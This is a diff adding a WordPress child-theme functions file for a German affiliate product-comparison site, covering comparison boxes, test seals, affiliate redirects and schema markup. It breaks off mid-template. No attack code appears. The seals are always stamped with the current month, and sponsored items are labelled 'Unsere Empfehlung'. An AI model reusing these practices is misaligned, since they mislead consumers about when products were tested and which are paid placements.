@@ -1,0 +1,4108 @@
+<?php
+
+// TV2 SEO: Entferne JSON-LD aus externem Content (verhindert Duplikate)
+function tv2_strip_external_jsonld($html) {
+    return preg_replace("/<script type=[\"']application\/ld\+json[\"'][^>]*>.*?<\/script>/is", "", $html);
+}
+/** Compatibility shim for WoodMart 8.x - woodmart_get_content_class removed */
+if ( ! function_exists( 'woodmart_get_content_class' ) ) {
+    function woodmart_get_content_class() {
+        $classes = 'wd-content-area';
+        if ( function_exists( 'woodmart_has_sidebar_in_page' ) && woodmart_has_sidebar_in_page() ) {
+            $classes .= ' wd-grid-col';
+        }
+        return $classes;
+    }
+}
+
+
+/**
+ * Enqueue script and styles for child theme
+ */
+function woodmart_child_enqueue_styles() {
+    $version = woodmart_get_theme_info( 'Version' );
+    wp_dequeue_style('bootstrap');
+    wp_deregister_style('bootstrap');
+    wp_enqueue_style( 'bootstrap', get_stylesheet_directory_uri() . '/css/bootstrap.min.css', array(), $version );
+
+    // Determine parent theme style handle (changed in Woodmart 8.x)
+    $parent_handle = wp_style_is( 'wd-style-base', 'registered' ) ? 'wd-style-base' : 'woodmart-style';
+
+    // Ensure Woodmart base loads after Bootstrap (so Woodmart body styles override Bootstrap defaults)
+    if ( 'wd-style-base' === $parent_handle ) {
+        $wd_style = wp_styles()->query( 'wd-style-base' );
+        if ( $wd_style && ! in_array( 'bootstrap', $wd_style->deps, true ) ) {
+            $wd_style->deps[] = 'bootstrap';
+        }
+    }
+
+    // Child style loads after parent theme AND bootstrap
+    wp_enqueue_style( 'child-style', get_stylesheet_directory_uri() . '/style.css', array( $parent_handle, 'bootstrap' ), '1.2.0' );
+}
+add_action( 'wp_enqueue_scripts', 'woodmart_child_enqueue_styles', 10010 );
+
+/********************** ADDED BY AYMEN HAJJI ********************/
+require_once(get_stylesheet_directory() . '/inc/url_encryptor.php');
+if (!function_exists('dd')) {
+    function dd($var, $end=false) {
+        if (is_array($var) || is_object($var)):
+            echo '<pre>';
+            print_r($var);
+        else:
+            echo $var;
+        endif;
+        if ($end) die();
+    }
+}
+
+function remove_unused_styles() {
+    // remove unused styles
+    $unused_styles=['wp-block-library', 'amazon-importer', 'wd-wp-gutenberg', 'wd-wpcf7'];
+    foreach($unused_styles as $unused_style) {
+        wp_dequeue_style( $unused_style );
+        wp_deregister_style( $unused_style);
+    }
+}
+add_action( 'wp_print_styles', 'remove_unused_styles', 100 );
+function add_taxonomies_to_pages() {
+    register_taxonomy_for_object_type( 'category', 'page' );
+}
+add_action( 'init', 'add_taxonomies_to_pages' );
+function remove_extra_image_sizes() {
+    foreach ( get_intermediate_image_sizes() as $size ) {
+        if ( !in_array( $size, array( 'thumbnail', 'medium', 'medium_large', 'large'/*, 'comparison_category_image'*/ ) ) ) {
+            remove_image_size( $size );
+        }
+    }
+}
+
+add_action('init', 'remove_extra_image_sizes');
+
+if( ! function_exists( 'comparison_add_image_size' ) ) {
+    add_action( 'after_setup_theme', 'comparison_add_image_size' );
+
+    function comparison_add_image_size() {
+
+        $width = 400;
+        $height = 250;
+
+        add_image_size( 'comparison_category_image', $width, $height, true );
+    }
+}
+if (!function_exists('comparison_add_scripts')) {
+    add_action('wp_enqueue_scripts', 'comparison_add_scripts');
+
+    function comparison_add_scripts() {
+        wp_enqueue_script('bootstrap', get_stylesheet_directory_uri() . '/js/bootstrap.min.js', ['jquery'], false, true);
+    }
+}
+function getYoutubeEmbedUrl($url)
+{
+    $shortUrlRegex = '/youtu.be\/([a-zA-Z0-9_-]+)\??/i';
+    $longUrlRegex = '/youtube.com\/((?:embed)|(?:watch))((?:\?v\=)|(?:\/))([a-zA-Z0-9_-]+)/i';
+    $youtube_id = '';
+    if (preg_match($longUrlRegex, $url, $matches)) {
+        $youtube_id = $matches[count($matches) - 1];
+    }
+
+    if (preg_match($shortUrlRegex, $url, $matches)) {
+        $youtube_id = $matches[count($matches) - 1];
+    }
+    return !empty($youtube_id)?'https://www.youtube.com/embed/' . $youtube_id:'' ;
+}
+add_shortcode( 'bts_youtube_video', 'render_youtube_video' );
+function render_youtube_video($atts){
+    $a = shortcode_atts( [
+        'id' => '',
+        'type' => ''
+    ], $atts );
+    $post_id = (int)$a['id'];
+    if (empty($post_id)) return;
+    $videoURL = get_field('video_url', $post_id);
+    if (empty($videoURL)) return;
+    $embedURL = getYoutubeEmbedUrl($videoURL);
+    if (empty($embedURL)) return;
+    $template = '';
+    $title = get_field('video_title', $post_id);
+    $subtitle = get_field('video_subtitle', $post_id);
+    if (!empty($title) && !empty($subtitle)) {
+        $template .= str_replace('%keyword%', $a['type'],"<div><h2><strong>{$title}</strong></h2><h3>{$subtitle}</h3></div>");
+    }
+    $template .= '<div class="bts-video-container"><iframe width="560" height="315" src="%embedURL%" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>';
+    $template = str_replace('%embedURL%', $embedURL, $template);
+    $template = apply_filters( 'the_content', $template );
+    echo  str_replace( ']]>', ']]&gt;', $template );
+}
+
+global $allProductsData;
+
+add_shortcode( 'vergleichsbox', 'render_comparison_box' );
+function render_comparison_box( $atts ) {
+    global $allProductsData, $bestProductsData, $productType, $productTypeId, $pageFaqSnippet;
+
+    $eanMatrix = [];
+    $a = [
+        'id' => $productTypeId,
+        'pid' => '',
+        'api' => false,
+        'price' => false
+    ];
+    
+    if (empty((int)$a['id'])) return;
+
+    $allProductsData=['champ'=>'','pricechamp'=>'','bestseller'=>'','minprice'=>'','maxprice'=>'','brands'=>[],'products'=>[], 
+    'product_ids' =>[], 'product_image' => []
+    ];
+
+    $args = array(
+        'post_type'      => 'advisor_product',
+        'posts_per_page' => -1,
+        'meta_query' => [
+            [
+                'relation' => 'AND',
+                'flag_clause' => [
+                    'key'       => 'flag',
+                    'type'      => 'NUMERIC'
+                ],
+                'grade_clause' => [
+                    'key'       => 'grade',
+                    'type'      => 'DECIMAL(3,2)'
+                ],
+                'status_clause' => [
+                    'key' => 'status',
+                    'type' => 'NUMERIC',
+                    'value' => 1
+                ]
+            ]
+        ],
+        'orderby' => [
+            'flag_clause'       => 'DESC',
+            'grade_clause'     => 'ASC',
+        ],
+        'tax_query' => array(
+            array(
+                'taxonomy'  => 'product_type',
+                'field'     => 'id',
+                'terms'     => $a['id']
+            )
+        ),
+    );
+    if (!empty((int)$a['pid'])) $args['post__in']=(array)((int)$a['pid']);
+    
+    ob_start();
+    
+    $product_attributes = get_field('product_attributes', 'product_type_' . $a['id']);
+    if (empty($product_attributes)) return;
+    
+    $specifics=$specifics_input=$rows=[];
+    foreach ($product_attributes as $attribute) {
+        $specifics['field_specific_'.sanitize_title($attribute['attribute_name'])]=__($attribute['attribute_name'], 'woodmart-child');
+        $specifics_input['field_specific_'.sanitize_title($attribute['attribute_name'])]=$attribute['input_field'];
+    }
+
+    $features1=[
+        'image'=>__('Picture', 'woodmart-child'),
+        'model'=>__('Model', 'woodmart-child'),
+        'brand'=>__('Brand', 'woodmart-child'),
+        'grade'=>__('Grade', 'woodmart-child'),
+    ];
+    $features2=[
+        'advantages'=>__('Advantages', 'woodmart-child'),
+        'disadvantages'=>__('Disadvantages', 'woodmart-child'),
+        'conclusion'=>__('Conclusion', 'woodmart-child'),
+        'offer'=>__('To offer', 'woodmart-child'),
+    ];
+    if ($a['price']) {
+        $features2=[
+            'advantages'=>__('Advantages', 'woodmart-child'),
+            'disadvantages'=>__('Disadvantages', 'woodmart-child'),
+            'conclusion'=>__('Conclusion', 'woodmart-child'),
+            'price' => __('Price', 'woodmart-child'),
+            'offer'=>__('To offer', 'woodmart-child'),
+        ];
+    }
+    $header = array_merge($features1, $specifics, $features2);
+    foreach ($header as $index=>$item) {
+        $rows[$index][]=$item;
+    }
+
+    $query = new WP_Query($args);
+    if($query->have_posts()) :
+        $found_products=$query->post_count;
+        $upload_dir=wp_get_upload_dir();
+        $merchant_dir='merchants';
+        $product_type_term = get_term($a['id']);   
+        
+        ?>
+        <div class="related-content-boxes">
+        <section class="tv-products-section" aria-label="Produktvergleich <?php echo esc_attr($product_type_term->name); ?>">
+            <h2 class="tv-products-section__heading">
+                <strong>Die besten <?php echo esc_html($product_type_term->name); ?> im Test & Vergleich:</strong>
+                <span>Wählen Sie Ihren Testsieger aus unseren Top-Empfehlungen.</span>
+            </h2>
+        <?php
+        
+        $product_index = 0;
+        while ($query->have_posts()) {
+            $query->the_post();
+            $current_post_id = get_the_ID();
+            $product_index++;
+            $internalLink=$externalLink=get_the_permalink();
+            $externalLinkTarget='_self';
+            $offers=[];
+            
+            if(have_rows('offers')):
+                while(have_rows('offers')) : the_row();
+                    $offers[]=[
+                        'partner'=>get_sub_field('partner_identifier'),
+                        'url'=>get_sub_field('url'),
+                        'price'=>(float)str_replace(',', '.', get_sub_field('price')),
+                        'special_price'=>(float)str_replace(',', '.', get_sub_field('special_price')),
+                    ];
+                    $price = (float)str_replace(',', '.', get_sub_field('price'));
+                    $special_price = (float)str_replace(',', '.', get_sub_field('special_price'));
+                    if ($special_price>0)
+                        $price = $special_price;
+                    if (!empty($allProductsData['minprice'])) {
+                        $allProductsData['minprice'] = min($allProductsData['minprice'],$price);
+                    } else {
+                        $allProductsData['minprice']=$price;
+                    }
+                    $allProductsData['maxprice']=max((float)$allProductsData['maxprice'],$price);
+                endwhile;
+            endif;
+            
+            $partnerLogo='';
+            $partnerName='';
+            $price = 0;
+            
+            if (!empty($offers)) :
+                $amazon_offer=array_search('amazon', array_combine(array_keys($offers), array_column($offers, 'partner')));
+                if ($amazon_offer !== false):
+                    $targetUrl=$offers[$amazon_offer]['url'];
+                    $partnerName=$offers[$amazon_offer]['partner'];
+                    $price = ($offers[$amazon_offer]['special_price']>0)?$offers[$amazon_offer]['special_price']:$offers[$amazon_offer]['price'];
+                else:
+                    $targetUrl=$offers[0]['url'];
+                    $partnerName=$offers[0]['partner'];
+                    $price = ($offers[0]['special_price']>0)?$offers[0]['special_price']:$offers[0]['price'];
+                endif;
+                $externalLinkTarget='_blank';
+                if ($a['api']):
+                    $externalLink=$targetUrl;
+                else:
+                    $externalLink=add_query_arg(
+                        ['to'=>external_link_encrypt_decrypt('encrypt', $targetUrl)],
+                        get_permalink(get_page_by_path( 'go' ))
+                    );
+                endif;
+                if (!defined('DS')) define('DS', DIRECTORY_SEPARATOR);
+                $partnerLogoName=$partnerName.'.png';
+                if (file_exists($upload_dir['basedir'].DS.$merchant_dir.DS.$partnerName.'.png')):
+                    $partnerLogo="<img src='{$upload_dir['baseurl']}/{$merchant_dir}/{$partnerLogoName}' class='tv-product__partner-logo' alt='".esc_attr(ucfirst($partnerName))."' width='80' height='24' loading='lazy' />";
+                endif;
+            endif;
+            
+            $title=get_the_title();
+            $image_url = get_the_post_thumbnail_url(get_the_ID(), 'medium');
+            $image_thumb = get_the_post_thumbnail_url(get_the_ID(), 'thumbnail');
+            
+            $rows['model'][]=$title;
+            $allProductsData['products'][]="<a href='{$externalLink}' target='_blank' rel='nofollow noopener sponsored'>{$title}</a>";
+            $allProductsData['product_ids'][] = $current_post_id;
+            $allProductsData['product_image'][] = $image_thumb;
+            $allProductsData['product_name'][] = $title;
+
+            $brand='';
+            $brandTerms=get_the_terms(get_the_ID(), 'brand');
+            if (is_array($brandTerms) && count($brandTerms)==1) {
+                $brand = $brandTerms[0]->name;
+                $allProductsData['brands'][]="<a href=\"{$externalLink}\" target='_blank' rel='nofollow noopener sponsored'>{$brand}</a>";
+            }
+            $rows['brand'][]=$brand;
+            
+            foreach (array_keys($specifics) as $specific) {
+                $specific_value=get_post_meta($current_post_id, $specific, true);
+                if (isset($specifics_input[$specific])):
+                    switch ($specifics_input[$specific]):
+                        case 'boolean': $specific_value='<div class="text-center"><i class="fas '.(($specific_value==1)?'fa-check color-green':'fa-times color-red').' fa-lg"></i></div>';
+                            break;
+                    endswitch;
+                endif;
+                $rows[$specific][]=$specific_value;
+            }
+            
+            $rows['advantages'][]=text_to_list(get_field('advantages'),'list-unstyled advantages', '<i class="fas fa-plus-square mr-2 color-green"></i>');
+            $rows['disadvantages'][]=text_to_list(get_field('disadvantages'),'list-unstyled disadvantages', '<i class="fas fa-minus-square mr-2 color-red"></i>');
+            $rows['conclusion'][]=get_field('conclusion');
+
+            if ($a['price']) {
+                $priceLabel = (isset($price) && $price > 0) ? "<span class='price-prefix'>".esc_html__('ca.', 'woodmart-child')."</span> ".number_format_i18n($price, 2).' EUR' : __('Check price', 'woodmart-child');
+                $rows['price'][]="<a class='price-link' href='{$externalLink}' target='{$externalLinkTarget}' rel='nofollow noopener sponsored'>".$priceLabel."</a>";
+            }
+            $rows['offer'][]="{$partnerLogo}<a class='btn btn-offer' href='{$externalLink}' target='{$externalLinkTarget}' rel='nofollow noopener sponsored'>".__('To Offer', 'woodmart-child')."</a>";
+            
+            $flag=get_field('flag');
+            $flagMapping[]=(!empty($flag)&&$found_products>1)?'flag-'.$flag:'';
+            $awardText='';
+            $test_label = 'Top Produkt';
+            $siegelClass = 'siegel_topProduct';
+            
+            switch ($flag) {
+                case 100:
+                    $awardText='Beste Empfehlung';
+                    $allProductsData['champ']="<a href=\"{$externalLink}\" target='_blank' rel='nofollow noopener sponsored'>{$title}</a>";
+                    $bestProductsData['champ']=['id'=>get_the_ID(),'name'=>$title,'link'=>$externalLink,'image'=>$image_url ?: $image_thumb];
+                    $test_label='Beste Empfehlung';
+                    $siegelClass='siegel_testChamp';
+                    break;
+                case 50:
+                    $awardText='Preis-Leistungs-Sieger';
+                    $allProductsData['pricechamp']="<a href=\"{$externalLink}\" target='_blank' rel='nofollow noopener sponsored'>{$title}</a>";
+                    $bestProductsData['pricechamp']=['id'=>get_the_ID(),'name'=>$title,'link'=>$externalLink,'image'=>$image_url ?: $image_thumb];
+                    $test_label='Preis-Tipp';
+                    $siegelClass='siegel_priceChamp';
+                    break;
+                case 10:
+                    $awardText='Bestseller';
+                    $allProductsData['bestseller']="<a href=\"{$externalLink}\" target='_blank' rel='nofollow noopener sponsored'>{$title}</a>";
+                    $test_label='Top Produkt';
+                    $siegelClass='siegel_topProduct';
+                    break;
+            }
+            
+            $awardClass=(!empty($flag)&&$found_products>1)?'award-'.$flag:'';
+            $rows['image'][]="<div class='award {$awardClass}'>{$awardText}</div> <a href='{$externalLink}' target='{$externalLinkTarget}' rel='nofollow noopener sponsored'><div class='ct-image'><img src='{$image_thumb}' alt='{$title}' /></div></a>";
+            
+            $test_note = get_field('grade');
+            $praedikat = '';
+            $testNote = '';
+            
+            if(trim($test_note)!="") {
+                if($test_note>=1 && $test_note<=1.5) {
+                    $praedikat='Sehr gut';
+                } elseif ($test_note>1.5 && $test_note<=2.5) {
+                    $praedikat='Gut';
+                } elseif ($test_note>2.5 && $test_note<=3.5) {
+                    $praedikat='Befriedigend';
+                } elseif ($test_note>3.5 && $test_note<=4) {
+                    $praedikat='Ausreichend';
+                } elseif ($test_note>4 && $test_note<=6) {
+                    $praedikat='Mangelhaft';
+                } else {
+                    $praedikat='Ohne Bewertung';
+                }
+                
+                $currentDate = date('m/Y');
+                $testNote='<a href="'.$externalLink.'" rel="nofollow noopener sponsored" target="_blank"><div class="testNote '.$siegelClass.'">';
+                if ($a['api']):
+                    $testNote.='<span class="testLabel">'.$test_label.'</span><span class="blogName">#BLOGNAME#</span>';
+                else:
+                    $testNote.='<span class="testLabel">'.$test_label.'</span><span class="blogName">test-vergleiche.com</span>';
+                endif;
+                if(get_field('field_is_sponsored')=='1') {
+                    $testNote.='<span class="testNotePraedikat">Unsere<br />Empfehlung</span><span class="testProdutctType">'.$productType.'</span><br /><span class="testDate">'.$currentDate.'</span>';
+                } else {
+                    $testNote.='<span class="testNoteVal">'.number_format_i18n($test_note, 1).'</span>';
+                    $testNote.='<span class="testNotePraedikat">'.$praedikat.'</span><span class="testProdutctType">'.$productType.'</span><br /><span class="testDate">'.$currentDate.'</span>';
+                }
+                $testNote.='</div></a>';
+                $rows['grade'][]=$testNote;
+            }
+            
+            // Technische Details sammeln
+            $tech_specs = [];
+            if (!empty($product_attributes)) {
+                $technische = [];
+                $c_attrs = 0;
+                foreach ($product_attributes as $attribute) {
+                    $technische[$c_attrs] = [
+                        'field' => 'field_specific_'.sanitize_title($attribute['attribute_name']),
+                        'type' => $attribute['input_field'],
+                        'label' => $attribute['attribute_name']
+                    ];
+                    $c_attrs++;
+                }
+                
+                if (!empty($technische)) {
+                    $num_specs = min(3, count($technische));
+                    if ($num_specs > 0) {
+                        $random_keys = array_rand($technische, $num_specs);
+                        if (!is_array($random_keys)) $random_keys = [$random_keys];
+                        foreach ($random_keys as $key) {
+                            if (isset($technische[$key])) {
+                                $tech_specs[] = [
+                                    'label' => $technische[$key]['label'],
+                                    'value' => get_post_meta($current_post_id, $technische[$key]['field'], true),
+                                    'type' => $technische[$key]['type']
+                                ];
+                            }
+                        }
+                    }
+                }
+            }
+            
+            // FAQ-Daten sammeln
+            $faq_data = [];
+            $questions_answers = get_field('fragen_und_antworten');
+            if ($questions_answers) {
+                foreach ($questions_answers as $row) {
+                    if (!empty($row['fragen'])) {
+                        $faq_data[] = [
+                            'question' => $row['fragen'],
+                            'answer' => $row['antworten']
+                        ];
+                        $pageFaqSnippet[] = [
+                            "@type" => "Question",
+                            "name" => strip_tags($row['fragen']),
+                            "acceptedAnswer" => [
+                                "@type" => "Answer",
+                                "text" => strip_tags($row['antworten'])
+                            ]
+                        ];
+                    }
+                }
+            }
+            
+            // Vorteile parsen - MAX 3 VORTEILE
+            $advantages_raw = get_field('advantages');
+            $pros_array = [];
+            if (!empty($advantages_raw)) {
+                $text = strip_tags($advantages_raw);
+                if (strpos($text, '|') !== false) {
+                    $pros_array = array_filter(array_map('trim', explode('|', $text)));
+                } elseif (strpos($text, ',') !== false) {
+                    $pros_array = array_filter(array_map('trim', explode(',', $text)));
+                } elseif (!empty(trim($text))) {
+                    $pros_array = [trim($text)];
+                }
+            }
+            // Limit auf 3 Vorteile
+            $pros_array = array_slice($pros_array, 0, 3);
+            
+            // Nachteile parsen - MAX 3
+            $disadvantages_raw = get_field('disadvantages');
+            $cons_array = [];
+            if (!empty($disadvantages_raw)) {
+                $text = strip_tags($disadvantages_raw);
+                if (strpos($text, '|') !== false) {
+                    $cons_array = array_filter(array_map('trim', explode('|', $text)));
+                } elseif (strpos($text, ',') !== false) {
+                    $cons_array = array_filter(array_map('trim', explode(',', $text)));
+                } elseif (!empty(trim($text))) {
+                    $cons_array = [trim($text)];
+                }
+            }
+            $cons_array = array_slice($cons_array, 0, 3);
+            
+            // Rating-Farbe
+            $rating_color = '#22c55e';
+            if ($test_note <= 1.5) $rating_color = '#22c55e';
+            elseif ($test_note <= 2.5) $rating_color = '#84cc16';
+            elseif ($test_note <= 3.5) $rating_color = '#eab308';
+            elseif ($test_note <= 4.0) $rating_color = '#f97316';
+            else $rating_color = '#ef4444';
+            
+            // Badge Config
+            $badge_config = [
+                100 => ['text' => 'Beste Empfehlung', 'class' => 'tv-product__badge--winner'],
+                50  => ['text' => 'Preis-Leistungs-Sieger', 'class' => 'tv-product__badge--price'],
+                10  => ['text' => 'Top Produkt', 'class' => 'tv-product__badge--top'],
+            ];
+            $current_badge = $badge_config[$flag] ?? null;
+            $show_badge = !empty($flag) && $found_products > 1;
+            
+            // Sterne berechnen (1-5)
+            $stars_filled = max(1, min(5, round(5 - $test_note + 1)));
+            $stars_rating = $stars_filled; // Für Schema.org
+            
+            // Unique IDs für ARIA
+            $faq_id = 'faq-' . $current_post_id;
+            
+            // Schema.org JSON-LD
+            $schema_product = [
+                "@context" => "https://schema.org",
+                "@type" => "Product",
+                "name" => $title,
+                "brand" => [
+                    "@type" => "Brand",
+                    "name" => $brand ?: "Unbekannt"
+                ],
+                "description" => get_field('conclusion') ?: $title,
+                "image" => $image_url ?: $image_thumb,
+                "sku" => get_field('ean') ?: $current_post_id,
+            ];
+            
+            // Offer hinzufügen wenn Preis vorhanden
+            if ($price > 0) {
+                $schema_product["offers"] = [
+                    "@type" => "Offer",
+                    "url" => $externalLink,
+                    "priceCurrency" => "EUR",
+                    "price" => number_format($price, 2, '.', ''),
+                    "availability" => "https://schema.org/InStock",
+                    "seller" => [
+                        "@type" => "Organization",
+                        "name" => ucfirst($partnerName ?: 'Amazon')
+                    ]
+                ];
+            }
+            
+            // AggregateRating nur wenn echte Bewertung vorhanden
+            if (!empty($test_note) && $test_note >= 1 && $test_note <= 6) {
+                $schema_product["aggregateRating"] = [
+                    "@type" => "AggregateRating",
+                    "ratingValue" => number_format(min(6 - $test_note, 5), 1, '.', ''),
+                    "bestRating" => "5",
+                    "worstRating" => "1",
+                    "ratingCount" => "1",
+                    "reviewCount" => "1"
+                ];
+            }
+            
+            // FAQPage Schema
+            $schema_faq = null;
+            if (!empty($faq_data)) {
+                $faq_entities = [];
+                foreach ($faq_data as $faq_item) {
+                    $faq_entities[] = [
+                        "@type" => "Question",
+                        "name" => strip_tags($faq_item['question']),
+                        "acceptedAnswer" => [
+                            "@type" => "Answer",
+                            "text" => strip_tags($faq_item['answer'])
+                        ]
+                    ];
+                }
+                $schema_faq = [
+                    "@context" => "https://schema.org",
+                    "@type" => "FAQPage",
+                    "mainEntity" => $faq_entities
+                ];
+            }
+            
+            // ================================================================
+            // HTML AUSGABE - SEO-OPTIMIERT
+            // ================================================================
+            ?>
+            
+            <?php /* SEO-Fix 2026-02-14: Schema-Duplikate entfernt - Product+FAQPage Schema
+               wird jetzt zentral ueber page_star_rating.inc.php + best_products_boxes.inc.php ausgegeben
+            <!-- Schema.org JSON-LD (DEAKTIVIERT)
+            <script type="application/ld+json">echo json_encode($schema_product)</script>
+            <script type="application/ld+json">echo json_encode($schema_faq)</script>
+            --> */ ?>
+            
+            <article class="tv-product" data-product-id="<?php echo esc_attr($current_post_id); ?>">
+                
+                <?php if ($show_badge): ?>
+                <div class="tv-product__badge <?php echo esc_attr($current_badge['class']); ?>" role="status">
+                    <span class="tv-product__badge-icon" aria-hidden="true">
+                        <?php if ($flag == 100): ?>🏆<?php elseif ($flag == 50): ?>💰<?php else: ?>⭐<?php endif; ?>
+                    </span>
+                    <span class="tv-product__badge-text"><?php echo esc_html($current_badge['text']); ?></span>
+                    <time class="tv-product__badge-date" datetime="<?php echo date('Y-m'); ?>"><?php echo esc_html(date('m/Y')); ?></time>
+                </div>
+                <?php endif; ?>
+
+                <div class="tv-product__main">
+                    
+                    <!-- Linke Spalte: Bild + Rating -->
+                    <div class="tv-product__media">
+                        
+                        <figure class="tv-product__image-container">
+                            <a href="<?php echo esc_url($externalLink); ?>" 
+                               target="<?php echo esc_attr($externalLinkTarget); ?>" 
+                               rel="sponsored nofollow noopener"
+                               aria-label="<?php echo esc_attr($title); ?> bei <?php echo esc_attr(ucfirst($partnerName ?: 'Amazon')); ?> ansehen">
+                                <?php if (!empty($image_url)): ?>
+                                <img src="<?php echo esc_url($image_url); ?>" 
+                                     srcset="<?php echo esc_url($image_thumb); ?> 150w, <?php echo esc_url($image_url); ?> 300w"
+                                     sizes="(max-width: 768px) 150px, 250px"
+                                     alt="<?php echo esc_attr($title); ?>"
+                                     class="tv-product__image"
+                                     width="250" 
+                                     height="250"
+                                     loading="lazy"
+                                     />
+                                <?php else: ?>
+                                <div class="tv-product__image-placeholder" aria-label="Kein Bild verfügbar">📦</div>
+                                <?php endif; ?>
+                            </a>
+                            <?php if (!empty($partnerLogo)): ?>
+                            <div class="tv-product__partner"><?php echo $partnerLogo; ?></div>
+                            <?php endif; ?>
+                        </figure>
+                        
+                        <div class="tv-product__rating" style="--rating-color: <?php echo $rating_color; ?>">
+                            <?php if (get_field('field_is_sponsored') == '1'): ?>
+                                <div class="tv-product__rating-sponsored">
+                                    <span class="tv-product__rating-label"><?php echo esc_html($test_label); ?></span>
+                                    <span class="tv-product__rating-value">Unsere<br>Empfehlung</span>
+                                </div>
+                            <?php else: ?>
+                                <div class="tv-product__rating-score">
+                                    <span class="tv-product__rating-value"><?php echo number_format_i18n($test_note, 1); ?></span>
+                                    
+                                    
+                                </div>
+                                <div class="tv-product__rating-label"><?php echo esc_html($praedikat); ?></div>
+                            <?php endif; ?>
+                            
+                            <div class="tv-product__rating-meta">
+                                <?php if (!empty($brand)): ?>
+                                <span class="tv-product__rating-brand"><?php echo esc_html($brand); ?></span>
+                                <?php endif; ?>
+                                <span class="tv-product__rating-category"><?php echo esc_html($productType ?: $product_type_term->name); ?></span>
+                                <time class="tv-product__rating-date" datetime="<?php echo date('Y-m'); ?>"><?php echo esc_html(date('m/Y')); ?></time>
+                            </div>
+                            
+                            <div class="tv-product__stars" role="img" aria-label="Bewertung: <?php echo $stars_filled; ?> von 5 Sternen">
+                                <?php for ($i = 1; $i <= 5; $i++): ?>
+                                <span class="tv-product__star <?php echo $i <= $stars_filled ? 'tv-product__star--filled' : ''; ?>" aria-hidden="true">★</span>
+                                <?php endfor; ?>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Rechte Spalte: Content -->
+                    <div class="tv-product__content">
+                        
+                        <!-- Header -->
+                        <header class="tv-product__header">
+                            <div class="tv-product__title-group">
+                                <?php if (!empty($brand)): ?>
+                                <span class="tv-product__brand"><?php echo esc_html($brand); ?></span>
+                                <?php endif; ?>
+                                <h3 class="tv-product__title">
+                                    <a href="<?php echo esc_url($externalLink); ?>" 
+                                       target="<?php echo esc_attr($externalLinkTarget); ?>" 
+                                       rel="sponsored nofollow noopener">
+                                        <?php echo esc_html($title); ?>
+                                    </a>
+                                </h3>
+                            </div>
+                            
+                            <div class="tv-product__actions">
+                                <?php if (!empty($price) && $price > 0): ?>
+                                <div class="tv-product__price">
+                                    <span class="tv-product__price-prefix">ca.</span>
+                                    <span class="tv-product__price-value" content="<?php echo number_format($price, 2, '.', ''); ?>"><?php echo number_format_i18n($price, 2); ?> €</span>
+                                    
+                                    
+                                </div>
+                                <?php endif; ?>
+                                
+                                <a href="<?php echo esc_url($externalLink); ?>" 
+                                   target="<?php echo esc_attr($externalLinkTarget); ?>" 
+                                   rel="sponsored nofollow noopener"
+                                   class="tv-product__cta"
+                                  >
+                                    <span>Zum Angebot</span>
+                                    <svg class="tv-product__cta-icon" viewBox="0 0 24 24" fill="currentColor" width="20" height="20" aria-hidden="true">
+                                        <path d="M18.71 11.29l-6-6a1 1 0 00-1.42 1.42L15.59 11H5a1 1 0 000 2h10.59l-4.3 4.29a1 1 0 000 1.42 1 1 0 001.42 0l6-6a1 1 0 000-1.42z"/>
+                                    </svg>
+                                </a>
+                            </div>
+                        </header>
+                        
+                        <!-- Technische Details -->
+                        <?php if (!empty($tech_specs)): ?>
+                        <section class="tv-product__specs" aria-labelledby="specs-title-<?php echo $current_post_id; ?>">
+                            <h4 class="tv-product__section-title" id="specs-title-<?php echo $current_post_id; ?>">
+                                <svg class="tv-product__section-icon" viewBox="0 0 24 24" fill="currentColor" width="20" height="20" aria-hidden="true">
+                                    <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14z"/>
+                                </svg>
+                                Technische Details
+                            </h4>
+                            <dl class="tv-product__specs-list">
+                                <?php foreach ($tech_specs as $spec): ?>
+                                <div class="tv-product__spec">
+                                    <dt class="tv-product__spec-label"><?php echo wp_kses_post($spec['label']); ?></dt>
+                                    <dd class="tv-product__spec-value">
+                                        <?php if (($spec['type'] ?? '') === 'boolean'): ?>
+                                            <?php if ($spec['value'] == 1): ?>
+                                            <span class="tv-product__check tv-product__check--yes" aria-label="Ja">✓</span>
+                                            <?php else: ?>
+                                            <span class="tv-product__check tv-product__check--no" aria-label="Nein">✗</span>
+                                            <?php endif; ?>
+                                        <?php else: ?>
+                                            <?php echo wp_kses_post($spec['value']); ?>
+                                        <?php endif; ?>
+                                    </dd>
+                                </div>
+                                <?php endforeach; ?>
+                            </dl>
+                        </section>
+                        <?php endif; ?>
+                        
+                        <!-- Vorteile & Nachteile -->
+                        <div class="tv-product__pros-cons">
+                            <?php if (!empty($pros_array)): ?>
+                            <section class="tv-product__pros" aria-labelledby="pros-title-<?php echo $current_post_id; ?>">
+                                <h4 class="tv-product__section-title tv-product__section-title--pros" id="pros-title-<?php echo $current_post_id; ?>">
+                                    <span class="tv-product__section-icon tv-product__section-icon--green" aria-hidden="true">✓</span>
+                                    Vorteile
+                                </h4>
+                                <ul class="tv-product__list tv-product__list--pros">
+                                    <?php foreach ($pros_array as $pro): ?>
+                                    <li class="tv-product__list-item">
+                                        <span class="tv-product__list-icon" aria-hidden="true">✓</span>
+                                        <span><?php echo esc_html($pro); ?></span>
+                                    </li>
+                                    <?php endforeach; ?>
+                                </ul>
+                            </section>
+                            <?php endif; ?>
+                            
+                            <?php if (!empty($cons_array)): ?>
+                            <section class="tv-product__cons" aria-labelledby="cons-title-<?php echo $current_post_id; ?>">
+                                <h4 class="tv-product__section-title tv-product__section-title--cons" id="cons-title-<?php echo $current_post_id; ?>">
+                                    <span class="tv-product__section-icon tv-product__section-icon--red" aria-hidden="true">✗</span>
+                                    Nachteile
+                                </h4>
+                                <ul class="tv-product__list tv-product__list--cons">
+                                    <?php foreach ($cons_array as $con): ?>
+                                    <li class="tv-product__list-item">
+                                        <span class="tv-product__list-icon" aria-hidden="true">✗</span>
+                                        <span><?php echo esc_html($con); ?></span>
+                                    </li>
+                                    <?php endforeach; ?>
+                                </ul>
+                            </section>
+                            <?php endif; ?>
+                        </div>
+                        
+                        <!-- FAQ Accordion -->
+                        <?php if (!empty($faq_data)): ?>
+                        <section class="tv-product__faq" aria-labelledby="faq-title-<?php echo $current_post_id; ?>">
+                            <h4 class="tv-product__section-title" id="faq-title-<?php echo $current_post_id; ?>">
